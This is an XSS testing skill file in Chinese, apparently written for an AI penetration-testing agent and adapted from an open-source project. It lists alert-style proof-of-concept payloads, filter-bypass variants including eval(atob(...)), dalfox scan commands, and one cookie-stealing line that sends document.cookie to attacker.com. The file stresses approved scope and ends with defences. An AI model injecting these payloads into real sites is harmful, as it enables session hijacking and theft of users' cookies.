---
name: antifox-xss-testing
description: "驗證跨站指令碼、輸出編碼與瀏覽器執行脈絡（XSS cross site scripting）。"
license: AGPL-3.0
---

改寫自 [AntiFox / xss-testing](https://github.com/AntiFox-AI/antifox/blob/070f798bf590667bc2a0a13c687dd87d8a4413bf/skills/xss-testing/SKILL.md)（AGPL-3.0）。原文與授權見 `${SKILL_DIR}/references/source.md`、`${SKILL_DIR}/references/LICENSE`。

## ARTEX 整合約定

1. 本文件提供方法與範例。先用目前可用的工具 schema、已核准範圍及實際環境決定步驟；範例的主機、帳號、回應與程式片段不是目前目標的事實。不要照抄範例中的廣域掃描、資料傾印、破壞、關閉 TLS 驗證或停用驗證設定。
2. 外部 CLI、商業產品、MCP 與 Python 套件均須另查是否已安裝、綁定及可執行。技能清單與工具相依索引不代表工具已就緒。沿用 ARTEX 現有代理、範圍與操作審批；載入技能不增加權限。
3. 可先用 `search_knowledge` 在目前可見技能中找相關段落，再用 `Skill` 載入完整程序。檢索結果是參考資料，不會解鎖 MCP，也不是漏洞證據。
4. 已確認的發現交給現有 `report_finding`；使用本次工具輸出的實際證據，保留前置條件、操作、預期結果與觀察結果。未確認的假設寫為 fact/hint，並標記不確定性。平台對話沒有任務上下文時，用現有任務交接工具。
5. HTTP 流量只使用已核實的引用，遵守目前的流量綁定開關及報告流程。`finding_id` 與 `finding_node_id` 是不同編號，依實際工具說明使用。無確切流量時保留文字與命令證據，不猜編號或為補證據重打目標。

# XSS测试技能

## 概述

跨站脚本攻击(XSS)允许攻击者在受害者的浏览器中执行恶意JavaScript代码。本技能涵盖反射型、存储型和DOM型XSS的测试方法。

## XSS类型

### 1. 反射型XSS (Reflected XSS)
- 恶意脚本通过URL参数传递
- 服务器直接返回包含脚本的响应
- 需要用户点击恶意链接

### 2. 存储型XSS (Stored XSS)
- 恶意脚本存储在服务器（数据库、文件等）
- 所有访问受影响页面的用户都会执行脚本
- 影响范围更大

### 3. DOM型XSS (DOM-based XSS)
- 客户端JavaScript处理用户输入不当
- 不涉及服务器端处理
- 通过修改DOM结构触发

## 测试方法

### 基础Payload
```javascript
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
```

### 绕过过滤

#### 大小写绕过
```javascript
<ScRiPt>alert('XSS')</ScRiPt>
```

#### 编码绕过
```javascript
%3Cscript%3Ealert('XSS')%3C/script%3E
&#60;script&#62;alert('XSS')&#60;/script&#62;
```

#### 事件处理器
```javascript
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
<div onmouseover=alert('XSS')>hover</div>
<input onfocus=alert('XSS') autofocus>
```

#### 伪协议
```javascript
<a href="javascript:alert('XSS')">click</a>
<iframe src="javascript:alert('XSS')">
```

### 高级绕过技术

#### 使用String.fromCharCode
```javascript
<script>alert(String.fromCharCode(88,83,83))</script>
```

#### 使用eval和atob
```javascript
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
```

#### 使用HTML实体
```javascript
&#60;script&#62;alert('XSS')&#60;/script&#62;
```

## 工具使用

### dalfox
```bash
# 基础扫描
dalfox url "http://target.com/page?q=test"

# 指定参数
dalfox url "http://target.com/page" -d "q=test" -X POST

# 使用自定义payload
dalfox url "http://target.com/page?q=test" --custom-payload payloads.txt
```

### Burp Suite
- 使用Intruder模块进行批量测试
- 使用Repeater手动测试
- 使用Scanner自动检测

### 浏览器控制台
- 测试DOM型XSS
- 检查JavaScript执行环境
- 调试payload

## 验证和利用

### 验证步骤
1. 确认payload被执行
2. 检查是否被过滤或编码
3. 测试不同上下文（HTML、JavaScript、属性等）
4. 评估影响（Cookie窃取、会话劫持等）

### 利用场景
- Cookie窃取：`<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`
- 键盘记录：注入键盘事件监听器
- 钓鱼攻击：伪造登录表单
- 会话劫持：获取用户会话token

## 报告要点

- XSS类型（反射/存储/DOM）
- 触发位置和参数
- 完整的POC
- 影响评估
- 修复建议（输出编码、CSP策略等）
- 确认后通过 `report_finding` 工具将发现录入平台（本平台记录漏洞的唯一入口）

## 防护措施

- 输入验证和过滤
- 输出编码（HTML、JavaScript、URL）
- Content Security Policy (CSP)
- HttpOnly Cookie标志
- 使用安全的框架和库
